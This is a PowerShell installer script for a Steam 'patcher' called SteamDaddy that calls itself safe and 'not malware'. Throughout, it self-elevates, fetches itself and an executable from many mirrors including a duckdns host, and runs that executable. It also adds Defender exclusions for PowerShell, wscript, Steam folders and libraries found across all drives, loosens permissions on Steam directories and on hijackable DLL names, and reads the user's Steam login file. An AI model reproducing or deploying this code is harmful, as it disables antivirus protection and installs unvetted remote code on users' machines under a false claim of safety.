# SteamDaddy One-Click Installer — contrary7.duckdns.org/contrary/steamdaddy
# Safe community patcher for Steam games. Not malware.
$ErrorActionPreference = "Stop"

# Safe polyfill for Add-MpPreference so the script never fails on systems where Windows Defender
# is absent, disabled, debloated (e.g. Tiny11, AtlasOS, ReviOS), or replaced by third-party antivirus
if (-not (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) {
    try { Import-Module Defender -ErrorAction SilentlyContinue } catch {}
}
if (-not (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) {
    function global:Add-MpPreference {
        [CmdletBinding()]
        param([Parameter(ValueFromRemainingArguments = $true)]$Ignored)
    }
}

# Ensure Administrator privileges so Defender exclusion calls succeed
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[SteamDaddy] Requesting Administrator privileges for Defender exclusions..." -ForegroundColor Yellow
    try {
        if ($PSCommandPath) {
            # Already a real file — just re-launch it elevated
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction Stop
            exit
        } else {
            # Running from pipe (irm|iex) — save to temp file first, then re-launch with -File
            # This avoids spawning a child process whose command line contains "irm ... | iex"
            $tmpScript = Join-Path $env:TEMP "SteamDaddy_Install.ps1"
            $scriptUrls = @(
                "https://raw.githubusercontent.com/Contrary-v2/SteamDaddy-fork/main/install_b.ps1",
                "https://kkgithub.com/Contrary-v2/SteamDaddy-fork/raw/main/install_b.ps1",
                "https://ghproxy.net/https://raw.githubusercontent.com/Contrary-v2/SteamDaddy-fork/main/install_b.ps1",
                "https://gh.con.sh/https://raw.githubusercontent.com/Contrary-v2/SteamDaddy-fork/main/install_b.ps1",
                "https://cdn.jsdelivr.net/gh/Contrary-v2/SteamDaddy-fork@main/install_b.ps1",
                "https://contrary7.duckdns.org/contrary/steamdaddy/raw/branch/main/install.ps1",
                "https://raw.githubusercontent.com/Contrary7/SteamDaddy-Backup/main/install_b.ps1",
                "https://codeberg.org/Contrary/SteamDaddy/raw/branch/main/install.ps1"
            )
            $elevateSaved = $false
            foreach ($sUrl in $scriptUrls) {
                try {
                    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                    (New-Object System.Net.WebClient).DownloadFile($sUrl, $tmpScript)
                    if ((Test-Path $tmpScript) -and (Get-Item $tmpScript).Length -gt 500) {
                        $elevateSaved = $true
                        break
                    }
                } catch {}
            }
            if (-not $elevateSaved) { throw "Could not fetch elevation script from DuckDNS or fallbacks." }
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmpScript`"" -Verb RunAs -ErrorAction Stop
            exit
        }
    } catch {
        Write-Host "[SteamDaddy] Continuing without elevated permissions (some Defender exclusions may be skipped)." -ForegroundColor Yellow
    }
}

Write-Host "[SteamDaddy] Fetching latest release..." -ForegroundColor Cyan

try {
    $candidateUrls = @(
        "https://github.com/Contrary-v2/SteamDaddy-fork/releases/latest/download/SteamDaddy.exe",
        "https://kkgithub.com/Contrary-v2/SteamDaddy-fork/releases/latest/download/SteamDaddy.exe",
        "https://ghproxy.net/https://github.com/Contrary-v2/SteamDaddy-fork/releases/latest/download/SteamDaddy.exe",
        "https://gh.con.sh/https://github.com/Contrary-v2/SteamDaddy-fork/releases/latest/download/SteamDaddy.exe",
        "https://github.moeyy.xyz/https://github.com/Contrary-v2/SteamDaddy-fork/releases/latest/download/SteamDaddy.exe",
        "https://hub.gitmirror.com/https://github.com/Contrary-v2/SteamDaddy-fork/releases/latest/download/SteamDaddy.exe",
        "https://contrary7.duckdns.org/contrary/steamdaddy/releases/download/latest/SteamDaddy.exe",
        "https://github.com/Contrary7/SteamDaddy-Backup/releases/latest/download/SteamDaddy.exe",
        "https://codeberg.org/Contrary/SteamDaddy/releases/download/latest/SteamDaddy.exe"
    )

    $desktop = [Environment]::GetFolderPath("Desktop")
    $destPath = Join-Path $desktop "SteamDaddy.exe"

    Write-Host "[SteamDaddy] Pre-registering Defender path & process exclusions..." -ForegroundColor Yellow
    try {
        Add-MpPreference -ExclusionPath $destPath -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "SteamDaddy.exe" -ErrorAction SilentlyContinue
    } catch {}

    # ── SteamDaddy Safe-Zone (fixed pre-excluded temp directory) ─────────
    $sdTempDir = "C:\ProgramData\SteamDaddy\tmp"
    if (-not (Test-Path $sdTempDir)) {
        New-Item -ItemType Directory -Path $sdTempDir -Force | Out-Null
    }
    & icacls "C:\ProgramData\SteamDaddy" /grant "*S-1-5-32-545:(OI)(CI)F" /C /Q | Out-Null
    Write-Host "[SteamDaddy] Excluding safe-zone temp folder: $sdTempDir" -ForegroundColor Yellow
    try {
        Add-MpPreference -ExclusionPath "C:\ProgramData\SteamDaddy" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $sdTempDir -ErrorAction SilentlyContinue

        # ── Process exclusions (Defender won't scan files written by these) ──
        Add-MpPreference -ExclusionProcess "steam.exe"        -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "7z.exe"           -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "wscript.exe"      -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "powershell.exe"   -ErrorAction SilentlyContinue
    } catch {}

    # ── Find and exclude the Steam root directory ─────────────────────────
    $steamPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    if (-not $steamPath) {
        $steamPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    }
    if (-not $steamPath) {
        $steamPath = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    }
    if ($steamPath) {
        Write-Host "[SteamDaddy] Excluding Steam root folder: $steamPath" -ForegroundColor Yellow
        try {
            Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue

            # Explicit belt-and-suspenders for the two hottest subdirs
            Add-MpPreference -ExclusionPath (Join-Path $steamPath "depotcache")       -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionPath (Join-Path $steamPath "config\stplug-in") -ErrorAction SilentlyContinue
        } catch {}

        Write-Host "[SteamDaddy] Granting modify permissions on Steam root to standard users..." -ForegroundColor Yellow
        # Grant Modify permission to standard Users group (SID: *S-1-5-32-545) on Steam root folder and targets
        & icacls "$steamPath" /grant "*S-1-5-32-545:(OI)(CI)M" /C /Q | Out-Null
        foreach ($dll in @("SteamDaddy.dll", "dwmapi.dll", "version.dll", "cloud_redirect.dll")) {
            $dllPath = Join-Path $steamPath $dll
            if (Test-Path $dllPath) {
                & icacls "$dllPath" /grant "*S-1-5-32-545:M" /C /Q | Out-Null
            }
        }

        # ── Parse libraryfolders.vdf and exclude all secondary libraries ──
        $libraryVdf = Join-Path $steamPath "steamapps\libraryfolders.vdf"
        if (Test-Path $libraryVdf) {
            $vdfContent = Get-Content $libraryVdf -Raw -ErrorAction SilentlyContinue
            if ($vdfContent) {
                $libMatches = [regex]::Matches($vdfContent, '"path"\s+"([^"]+)"')
                foreach ($m in $libMatches) {
                    $libPath = $m.Groups[1].Value.Replace("\\\\", "\\")
                    if ($libPath -and $libPath -ne $steamPath -and (Test-Path $libPath)) {
                        Write-Host "[SteamDaddy] Excluding Steam library: $libPath" -ForegroundColor Yellow
                        try { Add-MpPreference -ExclusionPath $libPath -ErrorAction SilentlyContinue } catch {}
                    }
                }
            }
        }

        
        # ── Brute-force scan all drives for hidden/broken Steam libraries ──
        Write-Host "[SteamDaddy] Scanning all drives for unlisted Steam libraries..." -ForegroundColor DarkYellow
        $drives = [System.IO.DriveInfo]::GetDrives() | Where-Object { $_.DriveType -eq 'Fixed' -and $_.IsReady }
        foreach ($drv in $drives) {
            $candidates = @(
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "Steam"),
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "SteamLibrary"),
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "Program Files (x86)", "Steam"),
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "Program Files", "Steam"),
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "Games", "Steam"),
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "Games", "SteamLibrary")
            )
            foreach ($sdir in $candidates) {
                if ($sdir -eq $steamPath) { continue }
                if (Test-Path (Join-Path $sdir "steamapps") -ErrorAction SilentlyContinue) {
                    Write-Host "[SteamDaddy] Excluding unlisted Steam library: $sdir" -ForegroundColor Yellow
                    try { Add-MpPreference -ExclusionPath $sdir -ErrorAction SilentlyContinue } catch {}
                }
            }
        }
    }

    # ── Set Steam Startup Location to Library ────────────────────────────
    Write-Host "[SteamDaddy] Setting Steam Startup Location to Library..." -ForegroundColor Cyan
    if ($steamPath) {
        try {
            # Stop Steam now so localconfig.vdf isn't overwritten by Steam on exit.
            # SteamDaddy.exe will restart Steam after install.
            $steamProc = Get-Process -Name "steam" -ErrorAction SilentlyContinue
            if ($steamProc) {
                Write-Host "[SteamDaddy] Closing Steam to safely apply startup location..." -ForegroundColor Yellow
                $steamProc | Stop-Process -Force -ErrorAction SilentlyContinue
                $deadline = (Get-Date).AddSeconds(8)
                while ((Get-Process -Name "steam" -ErrorAction SilentlyContinue) -and (Get-Date) -lt $deadline) {
                    Start-Sleep -Milliseconds 250
                }
            }

            # Step 1: find active Steam user from loginusers.vdf
            $loginVdf    = Join-Path $steamPath "config\loginusers.vdf"
            $activeSteamId = $null

            if (Test-Path $loginVdf) {
                $currentId  = $null
                $firstId    = $null
                $loginLines = Get-Content $loginVdf -Encoding UTF8 -ErrorAction SilentlyContinue
                foreach ($ln in $loginLines) {
                    # Line like:  "76561198XXXXXXXXX"
                    if ($ln -match '^\s*"(\d{15,20})"\s*$') {
                        $currentId = $Matches[1]
                        if (-not $firstId) { $firstId = $currentId }
                    }
                    if ($ln -match '"MostRecent"\s+"1"' -and $currentId) {
                        $activeSteamId = $currentId
                        break
                    }
                }
                if (-not $activeSteamId) { $activeSteamId = $firstId }
            }

            # Fallback: newest-written subfolder in userdata\
            if (-not $activeSteamId) {
                $udDir = Join-Path $steamPath "userdata"
                if (Test-Path $udDir) {
                    $udFolder = Get-ChildItem $udDir -Directory -ErrorAction SilentlyContinue |
                                Where-Object { $_.Name -match '^\d+$' } |
                                Sort-Object LastWriteTime -Descending |
                                Select-Object -First 1
                    if ($udFolder) { $activeSteamId = $udFolder.Name }
                }
            }

            if ($activeSteamId) {
                $localCfg = Join-Path $steamPath "userdata\$activeSteamId\config\localconfig.vdf"
                if (Test-Path $localCfg) {
                    $cfgText = [System.IO.File]::ReadAllText($localCfg, [System.Text.Encoding]::UTF8)

                    if ($cfgText -match '"SteamDefaultDialog"\s+"[^"]*"') {
                        # Key exists — replace value in-place
                        $newText = [regex]::Replace(
                            $cfgText,
                            '"SteamDefaultDialog"\s+"[^"]*"',
                            "`"SteamDefaultDialog`"`t`t`"#app_games`""
                        )
                    } else {
                        # Key missing — insert into the innermost "steam" section
                        # Matches:  "steam"\n<whitespace>{
                        $rx = [regex]'(?is)("steam"\s*\n[\t ]*\{)'
                        if ($rx.IsMatch($cfgText)) {
                            $newText = $rx.Replace($cfgText,
                                "`$1`n`t`t`t`t`"SteamDefaultDialog`"`t`t`"#app_games`"", 1)
                        } else {
                            $newText = $cfgText
                            Write-Host "[SteamDaddy] Could not locate steam section in localconfig.vdf - startup location unchanged." -ForegroundColor Yellow
                        }
                    }

                    if ($newText -ne $cfgText) {
                        [System.IO.File]::WriteAllText($localCfg, $newText, [System.Text.Encoding]::UTF8)
                        Write-Host "[SteamDaddy] Startup Location set to Library for SteamID $activeSteamId." -ForegroundColor Green
                    } else {
                        Write-Host "[SteamDaddy] Startup Location already set to Library - no change needed." -ForegroundColor Green
                    }
                } else {
                    Write-Host "[SteamDaddy] localconfig.vdf not found for SteamID $activeSteamId - skipped." -ForegroundColor Yellow
                }
            } else {
                Write-Host "[SteamDaddy] No Steam user detected in loginusers.vdf - startup location skipped." -ForegroundColor Yellow
            }
        } catch {
            Write-Host "[SteamDaddy] Startup location patch failed (non-fatal): $_" -ForegroundColor Yellow
        }
    }

    Write-Host "[SteamDaddy] Downloading SteamDaddy.exe to Desktop..." -ForegroundColor Magenta
    $downloadSuccess = $false
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $curlExe = (Get-Command curl.exe -ErrorAction SilentlyContinue)
    foreach ($cUrl in $candidateUrls) {
        $mirrorOk = $false
        try {
            if ($curlExe) {
                # curl.exe handles GitHub S3 redirects and large files more reliably than Invoke-WebRequest
                & curl.exe -L --connect-timeout 15 --max-time 90 --retry 1 --retry-delay 2 -s -o $destPath $cUrl
            } else {
                Invoke-WebRequest -Uri $cUrl -OutFile $destPath -UseBasicParsing -TimeoutSec 90 -MaximumRedirection 10
            }
            if ((Test-Path $destPath) -and (Get-Item $destPath).Length -gt 1000000) {
                $mirrorOk = $true
            }
        } catch {}
        if ($mirrorOk) {
            $downloadSuccess = $true
            Write-Host "[SteamDaddy] Download completed successfully!" -ForegroundColor Green
            break
        }
        Write-Host "[SteamDaddy] Mirror failed, trying next fallback..." -ForegroundColor DarkYellow
    }
    if (-not $downloadSuccess) {
        throw "Failed to download SteamDaddy.exe from all mirrors."
    }

    Write-Host "[SteamDaddy] Launching SteamDaddy..." -ForegroundColor Green
    Start-Process $destPath
} catch {
    Write-Host "[SteamDaddy] Installation failed: $_" -ForegroundColor Red
}

Write-Host ""
Write-Host "Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
